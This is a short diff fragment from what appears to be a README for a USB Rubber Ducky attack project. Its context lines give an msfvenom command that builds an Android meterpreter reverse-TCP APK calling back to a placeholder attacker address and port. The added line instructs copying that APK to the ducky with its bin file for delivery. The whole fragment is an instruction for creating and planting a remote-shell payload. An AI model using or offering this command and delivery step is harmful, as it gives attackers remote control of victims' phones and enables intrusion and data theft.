@@ -13,3 +13,4 @@ You can create an APK Payload with metasploit with the following command in the 
 
 msfvenom -p android/meterpreter_reverse_tcp LHOST=YOUR_ADDRESS LPORT=5555 -o WHATEVER_NAME.apk
 
+The APK file must then be copied to the ducky along side the bin file you place there as well.
